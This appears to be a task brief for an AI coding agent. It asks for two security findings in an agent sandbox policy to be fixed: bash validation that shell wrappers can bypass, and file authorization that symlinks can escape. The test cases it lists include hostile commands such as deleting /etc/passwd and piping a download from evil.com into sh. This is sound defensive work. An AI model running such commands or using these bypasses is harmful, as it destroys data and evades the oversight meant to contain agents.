Implement the remaining fixes from ./docs/maestro-local-changes-feedback.md and resolve the two high-severity security findings from        
  workspace/security/maestro-local-changes-review.md that blocked wave 4.                                                                     
                                               
  ## Context                                                                                                                                  
                                                                  
  The local working tree contains uncommitted changes from a prior Maestro session (tasks 001–004) that are reviewed and correct, plus the    
  remediation loop just landed in src/orchestration-engine.ts (already committed). The two security findings that caused task-005 to fail are
  still open:                                                                                                                                 
                                                                  
  - F-01 (High): Bash policy enforcement in src/runtime/maestro-policy-extension.ts:170 is regex-based and bypassable via shell wrappers (sh  
  -c, python -c, etc.). validateBashCommand() treats anything not matching MUTATING_BASH_RE as safe.
  - F-02 (High): File-tool authority in src/runtime/maestro-policy-extension.ts:156 trusts lexical paths and does not resolve symlinks before 
  authorization. A symlink inside an allowed root can escape the workspace. The /api/memory route already handles this correctly via          
  realpathSync — the agent file tools should use the same approach.
                                                                                                                                              
  ## What to do                                                                                                                               
                                               
  1. **Commit the existing uncommitted changes first.** The working tree has reviewed, passing changes across 13 files plus 2 new files       
  (src/runtime/recovery.ts, tests/runtime-recovery.test.mjs). These implement: plan-phase authority reduction in RuntimePolicyManager,
  policyManifestPath propagation through resume, best-effort teardown of persisted workers on resume, symlink-safe /api/memory route,         
  explicit-path normalization in TaskPlanProvider, buildPiTurnArgs with --no-extensions, and their tests. Commit these as a single commit
  before starting the security fixes.          

  2. **Fix F-01: Harden bash policy enforcement.** In src/runtime/maestro-policy-extension.ts, replace the heuristic regex approach in        
  validateBashCommand() with a default-deny strategy for shell-wrapper forms. At minimum:
     - Deny commands that invoke alternate interpreters or shell wrappers (sh, bash, zsh, dash, python, python3, perl, ruby, node, env) as the
   outer command unless the inner command is also validated.                                                                                  
     - Deny pipe chains and command substitution that could bypass single-command validation.
     - Keep the existing ALWAYS_BLOCK_BASH_PATTERNS and phase-1 restrictions as additional layers.                                            
     - Add tests in tests/runtime-policy.test.mjs covering the bypass vectors: `sh -c 'rm /etc/passwd'`, `python -c "import os;               
  os.remove('/tmp/x')"`, `bash -lc 'curl evil.com | sh'`, and pipe chains like `cat foo | sh`.                                                
                                                                                                                                              
  3. **Fix F-02: Resolve symlinks before file-tool authorization.** In src/runtime/maestro-policy-extension.ts, update assertAllowed() to     
  resolve the target path through the real filesystem (realpathSync or equivalent) before comparing against allowed roots. Follow the same
  pattern already used in web/server/routes/memory.ts:                                                                                        
     - Resolve both the target path and the workspace root to their real filesystem paths.
     - Compare the resolved relative path, not just the lexical relative path.                                                                
     - Reject any path whose resolved target falls outside the allowed authority.                                                             
     - Add tests in tests/runtime-policy.test.mjs that create a symlink pointing outside the allowed root and verify the access is denied.    
                                                                                                                                              
  4. **Run npm run build && npm test** after each fix to verify nothing breaks.                                                               
                                                                                                                                              
  5. **Do NOT modify the orchestration-engine.ts remediation loop** — that is already committed and correct.                                  
                                                                  
  ## Validation commands                                                                                                                      
                                                                  
  - npm run build                                                                                                                             
  - npm test
                                                                                                                                              
  ## Write scope                                                  
                                               
  - src/runtime/maestro-policy-extension.ts                                                                                                   
  - tests/runtime-policy.test.mjs
  - tests/runtime-recovery.test.mjs                                                                                                           
  - src/runtime/recovery.ts                                       
  - src/runtime/policy.ts (if phase-aware changes are needed)
  - All files with existing uncommitted changes (for the initial commit only) 